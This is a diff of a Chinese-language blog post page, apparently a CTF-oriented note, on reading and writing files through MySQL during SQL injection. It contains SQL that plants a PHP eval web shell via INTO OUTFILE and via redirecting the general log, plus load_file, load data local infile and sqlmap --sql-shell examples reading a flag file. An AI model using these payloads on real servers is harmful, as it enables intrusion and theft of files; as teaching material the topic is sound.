@@ -10,7 +10,7 @@
   <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
   
-  <meta name="keywords" content=sql注入>
+  <meta name="keywords" content=>
   
   
   
@@ -58,38 +58,46 @@
   </div>
 
   <!-- 文章目录 -->
-  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#开启outfile和load-file"><span class="toc-text">开启outfile和load_file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#outfile写文件"><span class="toc-text">outfile写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file读文件"><span class="toc-text">load_file读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap读写文件"><span class="toc-text">sqlmap读写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#没有权限的替代方法"><span class="toc-text">没有权限的替代方法</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#outfile和load-file"><span class="toc-text">outfile和load_file</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#secure-file-priv"><span class="toc-text">secure_file_priv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#outfile写文件"><span class="toc-text">outfile写文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-file读文件"><span class="toc-text">load_file读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap读写文件"><span class="toc-text">sqlmap读写文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#没有权限的替代方法"><span class="toc-text">没有权限的替代方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写日志"><span class="toc-text">写日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#load-data-local-infile"><span class="toc-text">load data local infile</span></a></li></ol></li></ol>
 
   <div class="post-content">
-    <h2 id="开启outfile和load-file"><a href="#开启outfile和load-file" class="headerlink" title="开启outfile和load_file"></a>开启outfile和load_file</h2><p>mysql中有一个叫做secure_file_priv的选项限制了写文件和读文件</p>
+    <h1 id="outfile和load-file"><a href="#outfile和load-file" class="headerlink" title="outfile和load_file"></a>outfile和load_file</h1><h2 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h2><p>mysql中有一个叫做secure_file_priv的选项限制了写文件和读文件</p>
 <ul>
 <li>secure_file_priv=null<br>不允许写文件或读文件</li>
 <li>secure_file_priv=路径<br>只能在该路径下写文件或读文件</li>
 <li>secure_file_priv=<br>随便写随便读</li>
 </ul>
-<p>可以用<code>show global variables like &#39;%secure%&#39;;</code>或者<code>select @@global.secure_file_priv;</code><br>查看secure_file_priv</p>
+<p>可以用show global variables like ‘%secure%’;<br>查看secure_file_priv</p>
 <p>linux在/etc/mysql/my.cnf中的[mysqld]下面设置secure_file_priv<br>windows在mysql目录的my.ini中的[mysqld]下面设置secure_file_priv</p>
 <h2 id="outfile写文件"><a href="#outfile写文件" class="headerlink" title="outfile写文件"></a>outfile写文件</h2><p>示例:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST['</span>a<span class="string">']) ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/a.php'</span>;</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>outfile 后面的路径不能用十六进制代替，只能用引号</li>
 </ul>
 <h2 id="load-file读文件"><a href="#load-file读文件" class="headerlink" title="load_file读文件"></a>load_file读文件</h2><p>示例:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'D:/flag.txt'</span>); <span class="comment">#注意windows下的路径也要改成/</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x443a2f666c61672e747874</span>); <span class="comment">#0x443a2f666c61672e747874是D:/flag.txt的十六进制</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>);</span><br></pre></td></tr></table></figure>
-<h2 id="sqlmap读写文件"><a href="#sqlmap读写文件" class="headerlink" title="sqlmap读写文件"></a>sqlmap读写文件</h2><p>比如<br>sqlmap -r post2.txt -v3 –sql-shell<br>获取sql-shell权限,然后<br>select load_file(‘/flag.txt’)<br>读文件</p>
-<h2 id="没有权限的替代方法"><a href="#没有权限的替代方法" class="headerlink" title="没有权限的替代方法"></a>没有权限的替代方法</h2><p>即便secure_file_priv为null，我们还可以用写日志的方式去写文件</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">'D:/phpStudy/a.php'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[123]) ?&gt;'</span>;</span><br><span class="line"><span class="comment">#也可以用十六进制</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="number">0x443a2f70687073747564792f612e706870</span>;<span class="keyword">select</span> <span class="number">0x443a2f70687073747564792f612e706870</span>;</span><br></pre></td></tr></table></figure>
-<p>查看 general_log</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;</span><br></pre></td></tr></table></figure>
 
+<h2 id="sqlmap读写文件"><a href="#sqlmap读写文件" class="headerlink" title="sqlmap读写文件"></a>sqlmap读写文件</h2><p>比如<br>sqlmap -r post2.txt -v3 –sql-shell<br>获取sql-shell权限,然后<br>select load_file(‘/flag.txt’)<br>读文件</p>
+<h1 id="没有权限的替代方法"><a href="#没有权限的替代方法" class="headerlink" title="没有权限的替代方法"></a>没有权限的替代方法</h1><h2 id="写日志"><a href="#写日志" class="headerlink" title="写日志"></a>写日志</h2><p>即便secure_file_priv为null，我们还可以用写日志的方式去写文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">'D:/phpStudy/a.php'</span>;<span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[123]) ?&gt;'</span>;</span><br><span class="line"><span class="comment">#也可以用十六进制</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;<span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="number">0x443a2f70687073747564792f612e706870</span>;<span class="keyword">select</span> <span class="number">0x443a2f70687073747564792f612e706870</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="load-data-local-infile"><a href="#load-data-local-infile" class="headerlink" title="load data local infile"></a>load data local infile</h2><p>详细参见<a href="https://paper.seebug.org/1112/#to-rce" target="_blank" rel="noopener">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></p>
+<ul>
+<li><code>load data infile</code>与<code>load_file</code>类似，同样受<code>secure_file_priv</code>的限制</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">"D://flag.txt"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>;</span><br><span class="line"><span class="comment">/* ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span></span><br><span class="line"><span class="comment">mysql&gt; load data local infile "D://flag.txt" into table test;*/</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>load data local infile</code>则不受限制</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"D://flag.txt"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure>
   </div>
   <div class="post-meta">
     <span class="post-time" style="color:#646060;font-size:13px">2019-06-17</span>
   </div>
 
   <div class="post-footer">
-    
-      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
     
 
     <a href="#top" class="top">Back to Top</a>
